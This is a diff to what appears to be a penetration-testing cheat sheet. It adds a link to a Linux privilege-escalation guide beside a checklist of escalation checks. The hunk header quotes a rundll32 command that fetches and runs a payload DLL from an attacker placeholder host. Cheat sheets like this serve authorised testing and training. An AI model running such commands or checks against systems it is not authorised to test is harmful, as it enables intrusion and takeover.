@@ -832,7 +832,7 @@ rundll32 shell32.dll,Control_RunDLL http://<LHOST>/payload.dll
 
 ## 10. Linux Privilege Escalation
 
-> **Concept:** Check in order: (1) sudo -l for free privesc, (2) SUID/GUID binaries, (3) writable cron jobs, (4) sensitive files (passwords in configs/history), (5) capabilities, (6) writable /etc/passwd, (7) kernel exploits. GTFOBins is your friend: https://gtfobins.github.io
+> **Concept:** Check in order: (1) sudo -l for free privesc, (2) SUID/GUID binaries, (3) writable cron jobs, (4) sensitive files (passwords in configs/history), (5) capabilities, (6) writable /etc/passwd, (7) kernel exploits. GTFOBins is your friend: https://gtfobins.github.io | https://github.com/ThatTotallyRealMyth/LinuxPrivEsc/blob/main/Linux-PrivEsc.md
 
 ### Situational Awareness
 ```bash
